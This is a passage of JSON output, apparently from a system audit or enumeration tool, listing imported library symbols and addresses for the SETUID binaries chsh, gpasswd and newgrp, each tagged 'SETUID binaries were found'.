                        "sleep",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chsh",
                        "0x0000cfb8",
                        "endusershell",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chsh",
                        "0x0000cfc0",
                        "getc",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chsh",
                        "0x0000cfc8",
                        "fork",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chsh",
                        "0x0000cfd0",
                        "__ctype_b_loc",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chsh",
                        "0x0000cfd8",
                        "_ITM_deregisterTMCloneTable",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chsh",
                        "0x0000cfe0",
                        "__libc_start_main",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chsh",
                        "0x0000cfe8",
                        "__gmon_start__",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chsh",
                        "0x0000cff0",
                        "_ITM_registerTMCloneTable",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chsh",
                        "0x0000cff8",
                        "__cxa_finalize",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chsh",
                        "0x0000d0a0",
                        "misc_conv",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chsh",
                        "0x0000d5e8",
                        "fgets",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chsh",
                        "0x0000d5f0",
                        "fputs",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chsh",
                        "0x0000d620",
                        "stdout",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chsh",
                        "0x0000d630",
                        "stdin",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chsh",
                        "0x0000d638",
                        "optind",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chsh",
                        "0x0000d640",
                        "__environ",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chsh",
                        "0x0000d648",
                        "optarg",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/chsh",
                        "0x0000d660",
                        "stderr",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/gpasswd",
                        "0x00000000",
                        "__cxa_finalize",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/gpasswd",
                        "0x0000d510",
                        "setsgent",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/gpasswd",
                        "0x0000d550",
                        "endsgent",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/gpasswd",
                        "0x0000d590",
                        "sgetsgent",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/gpasswd",
                        "0x0000d740",
                        "fgetsgent",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/gpasswd",
                        "0x0000d8b0",
                        "getsgent",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/gpasswd",
                        "0x0000d8f0",
                        "getsgnam",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/gpasswd",
                        "0x0000d930",
                        "putsgent",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/gpasswd",
                        "0x00014bd8",
                        "__strcat_chk",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/gpasswd",
                        "0x00014be0",
                        "utime",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/gpasswd",
                        "0x00014be8",
                        "__snprintf_chk",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/gpasswd",
                        "0x00014bf0",
                        "free",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/gpasswd",
                        "0x00014bf8",
                        "is_selinux_enabled",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/gpasswd",
                        "0x00014c00",
                        "strcasecmp",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/gpasswd",
                        "0x00014c08",
                        "closelog",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/gpasswd",
                        "0x00014c10",
                        "__errno_location",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/gpasswd",
                        "0x00014c18",
                        "srandom",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/gpasswd",
                        "0x00014c20",
                        "unlink",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/gpasswd",
                        "0x00014c28",
                        "strncpy",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/gpasswd",
                        "0x00014c30",
                        "strncmp",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/gpasswd",
                        "0x00014c38",
                        "_exit",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/gpasswd",
                        "0x00014c40",
                        "strcpy",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/gpasswd",
                        "0x00014c48",
                        "chroot",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/gpasswd",
                        "0x00014c50",
                        "puts",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/gpasswd",
                        "0x00014c58",
                        "ferror",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/gpasswd",
                        "0x00014c60",
                        "lckpwdf",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/gpasswd",
                        "0x00014c68",
                        "qsort",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/gpasswd",
                        "0x00014c70",
                        "isatty",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/gpasswd",
                        "0x00014c78",
                        "selinux_check_access",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/gpasswd",
                        "0x00014c80",
                        "fcntl",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/gpasswd",
                        "0x00014c88",
                        "write",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/gpasswd",
                        "0x00014c90",
                        "getpid",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/gpasswd",
                        "0x00014c98",
                        "textdomain",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/gpasswd",
                        "0x00014ca0",
                        "__open_2",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/gpasswd",
                        "0x00014ca8",
                        "fclose",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/gpasswd",
                        "0x00014cb0",
                        "bindtextdomain",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/gpasswd",
                        "0x00014cb8",
                        "stpcpy",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/gpasswd",
                        "0x00014cc0",
                        "dcgettext",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/gpasswd",
                        "0x00014cc8",
                        "strlen",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/gpasswd",
                        "0x00014cd0",
                        "__lxstat",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/gpasswd",
                        "0x00014cd8",
                        "getpwuid_r",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/gpasswd",
                        "0x00014ce0",
                        "chdir",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/gpasswd",
                        "0x00014ce8",
                        "__stack_chk_fail",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/gpasswd",
                        "0x00014cf0",
                        "getuid",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/gpasswd",
                        "0x00014cf8",
                        "getopt_long",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/gpasswd",
                        "0x00014d00",
                        "setbuf",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/gpasswd",
                        "0x00014d08",
                        "strchr",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/gpasswd",
                        "0x00014d10",
                        "rewind",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/gpasswd",
                        "0x00014d18",
                        "snprintf",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/gpasswd",
                        "0x00014d20",
                        "audit_open",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/gpasswd",
                        "0x00014d28",
                        "strrchr",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/gpasswd",
                        "0x00014d30",
                        "gettimeofday",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/gpasswd",
                        "0x00014d38",
                        "__assert_fail",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/gpasswd",
                        "0x00014d40",
                        "fputs",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/gpasswd",
                        "0x00014d48",
                        "memset",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/gpasswd",
                        "0x00014d50",
                        "geteuid",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/gpasswd",
                        "0x00014d58",
                        "selinux_set_callback",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/gpasswd",
                        "0x00014d60",
                        "close",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/gpasswd",
                        "0x00014d68",
                        "strspn",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/gpasswd",
                        "0x00014d70",
                        "matchpathcon",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/gpasswd",
                        "0x00014d78",
                        "strcspn",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/gpasswd",
                        "0x00014d80",
                        "read",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/gpasswd",
                        "0x00014d88",
                        "fgets",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/gpasswd",
                        "0x00014d90",
                        "execve",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/gpasswd",
                        "0x00014d98",
                        "calloc",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/gpasswd",
                        "0x00014da0",
                        "strcmp",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/gpasswd",
                        "0x00014da8",
                        "putc",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/gpasswd",
                        "0x00014db0",
                        "signal",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/gpasswd",
                        "0x00014db8",
                        "strtoll",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/gpasswd",
                        "0x00014dc0",
                        "getpwnam",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/gpasswd",
                        "0x00014dc8",
                        "getprevcon",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/gpasswd",
                        "0x00014dd0",
                        "feof",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/gpasswd",
                        "0x00014dd8",
                        "umask",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/gpasswd",
                        "0x00014de0",
                        "strtol",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/gpasswd",
                        "0x00014de8",
                        "realpath",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/gpasswd",
                        "0x00014df0",
                        "memcpy",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/gpasswd",
                        "0x00014df8",
                        "getgrnam",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/gpasswd",
                        "0x00014e00",
                        "kill",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/gpasswd",
                        "0x00014e08",
                        "fileno",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/gpasswd",
                        "0x00014e10",
                        "__stpcpy_chk",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/gpasswd",
                        "0x00014e18",
                        "getgid",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/gpasswd",
                        "0x00014e20",
                        "l64a",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/gpasswd",
                        "0x00014e28",
                        "__xstat",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/gpasswd",
                        "0x00014e30",
                        "setfscreatecon",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/gpasswd",
                        "0x00014e38",
                        "random",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/gpasswd",
                        "0x00014e40",
                        "malloc",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/gpasswd",
                        "0x00014e48",
                        "fflush",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/gpasswd",
                        "0x00014e50",
                        "__vasprintf_chk",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/gpasswd",
                        "0x00014e58",
                        "__fxstat",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/gpasswd",
                        "0x00014e60",
                        "getlogin",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/gpasswd",
                        "0x00014e68",
                        "fseek",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/gpasswd",
                        "0x00014e70",
                        "security_getenforce",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/gpasswd",
                        "0x00014e78",
                        "__fgets_chk",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/gpasswd",
                        "0x00014e80",
                        "__strncpy_chk",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/gpasswd",
                        "0x00014e88",
                        "setrlimit",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/gpasswd",
                        "0x00014e90",
                        "setreuid",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/gpasswd",
                        "0x00014e98",
                        "setregid",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/gpasswd",
                        "0x00014ea0",
                        "realloc",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/gpasswd",
                        "0x00014ea8",
                        "fdopen",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/gpasswd",
                        "0x00014eb0",
                        "getpwnam_r",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/gpasswd",
                        "0x00014eb8",
                        "setlocale",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/gpasswd",
                        "0x00014ec0",
                        "__printf_chk",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/gpasswd",
                        "0x00014ec8",
                        "fchmod",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/gpasswd",
                        "0x00014ed0",
                        "__syslog_chk",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/gpasswd",
                        "0x00014ed8",
                        "fsync",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/gpasswd",
                        "0x00014ee0",
                        "waitpid",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/gpasswd",
                        "0x00014ee8",
                        "tcgetattr",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/gpasswd",
                        "0x00014ef0",
                        "tcsetattr",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/gpasswd",
                        "0x00014ef8",
                        "getpass",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/gpasswd",
                        "0x00014f00",
                        "open",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/gpasswd",
                        "0x00014f08",
                        "access",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/gpasswd",
                        "0x00014f10",
                        "fchown",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/gpasswd",
                        "0x00014f18",
                        "audit_log_user_avc_message",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/gpasswd",
                        "0x00014f20",
                        "fopen",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/gpasswd",
                        "0x00014f28",
                        "ulckpwdf",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/gpasswd",
                        "0x00014f30",
                        "perror",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/gpasswd",
                        "0x00014f38",
                        "rename",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/gpasswd",
                        "0x00014f40",
                        "strtoul",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/gpasswd",
                        "0x00014f48",
                        "__cxa_atexit",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/gpasswd",
                        "0x00014f50",
                        "openlog",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/gpasswd",
                        "0x00014f58",
                        "freecon",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/gpasswd",
                        "0x00014f60",
                        "link",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/gpasswd",
                        "0x00014f68",
                        "exit",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/gpasswd",
                        "0x00014f70",
                        "__fprintf_chk",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/gpasswd",
                        "0x00014f78",
                        "audit_log_user_message",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/gpasswd",
                        "0x00014f80",
                        "__strncat_chk",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/gpasswd",
                        "0x00014f88",
                        "audit_log_acct_message",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/gpasswd",
                        "0x00014f90",
                        "setuid",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/gpasswd",
                        "0x00014f98",
                        "strdup",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/gpasswd",
                        "0x00014fa0",
                        "strerror",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/gpasswd",
                        "0x00014fa8",
                        "crypt",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/gpasswd",
                        "0x00014fb0",
                        "sleep",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/gpasswd",
                        "0x00014fb8",
                        "getc",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/gpasswd",
                        "0x00014fc0",
                        "putgrent",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/gpasswd",
                        "0x00014fc8",
                        "fork",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/gpasswd",
                        "0x00014fd0",
                        "__ctype_b_loc",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/gpasswd",
                        "0x00014fd8",
                        "_ITM_deregisterTMCloneTable",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/gpasswd",
                        "0x00014fe0",
                        "__libc_start_main",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/gpasswd",
                        "0x00014fe8",
                        "__gmon_start__",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/gpasswd",
                        "0x00014ff0",
                        "_ITM_registerTMCloneTable",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/gpasswd",
                        "0x00014ff8",
                        "__cxa_finalize",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/gpasswd",
                        "0x00016080",
                        "stdout",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/gpasswd",
                        "0x00016090",
                        "stdin",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/gpasswd",
                        "0x00016098",
                        "optind",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/gpasswd",
                        "0x000160a0",
                        "__environ",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/gpasswd",
                        "0x000160a8",
                        "optarg",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/gpasswd",
                        "0x000160c0",
                        "stderr",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/newgrp",
                        "0x00000000",
                        "__cxa_finalize",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/newgrp",
                        "0x00006b30",
                        "setsgent",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/newgrp",
                        "0x00006b70",
                        "endsgent",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/newgrp",
                        "0x00006bb0",
                        "sgetsgent",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/newgrp",
                        "0x00006d60",
                        "fgetsgent",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/newgrp",
                        "0x00006ed0",
                        "getsgent",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/newgrp",
                        "0x00006f10",
                        "getsgnam",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/newgrp",
                        "0x00006f50",
                        "putsgent",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/newgrp",
                        "0x0000ad40",
                        "endgrent",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/newgrp",
                        "0x0000ad48",
                        "getenv",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/newgrp",
                        "0x0000ad50",
                        "__snprintf_chk",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/newgrp",
                        "0x0000ad58",
                        "free",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/newgrp",
                        "0x0000ad60",
                        "strcasecmp",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/newgrp",
                        "0x0000ad68",
                        "closelog",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/newgrp",
                        "0x0000ad70",
                        "endspent",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/newgrp",
                        "0x0000ad78",
                        "__errno_location",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/newgrp",
                        "0x0000ad80",
                        "strncpy",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/newgrp",
                        "0x0000ad88",
                        "strncmp",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/newgrp",
                        "0x0000ad90",
                        "strcpy",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/newgrp",
                        "0x0000ad98",
                        "getgrent",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/newgrp",
                        "0x0000ada0",
                        "ferror",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/newgrp",
                        "0x0000ada8",
                        "getpid",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/newgrp",
                        "0x0000adb0",
                        "textdomain",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/newgrp",
                        "0x0000adb8",
                        "fclose",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/newgrp",
                        "0x0000adc0",
                        "getspnam_r",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/newgrp",
                        "0x0000adc8",
                        "bindtextdomain",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/newgrp",
                        "0x0000add0",
                        "stpcpy",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/newgrp",
                        "0x0000add8",
                        "dcgettext",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/newgrp",
                        "0x0000ade0",
                        "strlen",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/newgrp",
                        "0x0000ade8",
                        "getpwuid_r",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/newgrp",
                        "0x0000adf0",
                        "chdir",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/newgrp",
                        "0x0000adf8",
                        "__stack_chk_fail",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/newgrp",
                        "0x0000ae00",
                        "getuid",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/newgrp",
                        "0x0000ae08",
                        "strchr",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/newgrp",
                        "0x0000ae10",
                        "rewind",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/newgrp",
                        "0x0000ae18",
                        "setgrent",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/newgrp",
                        "0x0000ae20",
                        "getgrgid",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/newgrp",
                        "0x0000ae28",
                        "audit_open",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/newgrp",
                        "0x0000ae30",
                        "strrchr",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/newgrp",
                        "0x0000ae38",
                        "__assert_fail",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/newgrp",
                        "0x0000ae40",
                        "fputs",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/newgrp",
                        "0x0000ae48",
                        "memset",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/newgrp",
                        "0x0000ae50",
                        "setgroups",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/newgrp",
                        "0x0000ae58",
                        "strspn",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/newgrp",
                        "0x0000ae60",
                        "strcspn",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/newgrp",
                        "0x0000ae68",
                        "fgets",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/newgrp",
                        "0x0000ae70",
                        "calloc",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/newgrp",
                        "0x0000ae78",
                        "strcmp",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/newgrp",
                        "0x0000ae80",
                        "putc",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/newgrp",
                        "0x0000ae88",
                        "signal",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/newgrp",
                        "0x0000ae90",
                        "feof",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/newgrp",
                        "0x0000ae98",
                        "strtol",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/newgrp",
                        "0x0000aea0",
                        "memcpy",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/newgrp",
                        "0x0000aea8",
                        "getgrnam",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/newgrp",
                        "0x0000aeb0",
                        "kill",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/newgrp",
                        "0x0000aeb8",
                        "getgid",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/newgrp",
                        "0x0000aec0",
                        "getgroups",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/newgrp",
                        "0x0000aec8",
                        "malloc",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/newgrp",
                        "0x0000aed0",
                        "endpwent",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/newgrp",
                        "0x0000aed8",
                        "getlogin",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/newgrp",
                        "0x0000aee0",
                        "__strncpy_chk",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/newgrp",
                        "0x0000aee8",
                        "ttyname",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/newgrp",
                        "0x0000aef0",
                        "realloc",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/newgrp",
                        "0x0000aef8",
                        "getgrgid_r",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/newgrp",
                        "0x0000af00",
                        "getpwnam_r",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/newgrp",
                        "0x0000af08",
                        "setlocale",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/newgrp",
                        "0x0000af10",
                        "__printf_chk",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/newgrp",
                        "0x0000af18",
                        "__syslog_chk",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/newgrp",
                        "0x0000af20",
                        "setgid",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/newgrp",
                        "0x0000af28",
                        "waitpid",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/newgrp",
                        "0x0000af30",
                        "getpass",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/newgrp",
                        "0x0000af38",
                        "access",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/newgrp",
                        "0x0000af40",
                        "fopen",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/newgrp",
                        "0x0000af48",
                        "perror",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/newgrp",
                        "0x0000af50",
                        "sysconf",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/newgrp",
                        "0x0000af58",
                        "strtoul",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/newgrp",
                        "0x0000af60",
                        "openlog",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/newgrp",
                        "0x0000af68",
                        "getgrnam_r",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/newgrp",
                        "0x0000af70",
                        "exit",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/newgrp",
                        "0x0000af78",
                        "execle",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/newgrp",
                        "0x0000af80",
                        "__fprintf_chk",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/newgrp",
                        "0x0000af88",
                        "audit_log_user_message",
                        "SETUID binaries were found"
                     ],
                     [
                        "/usr/bin/newgrp",
                        "0x0000af90",
                        "audit_log_acct_message",
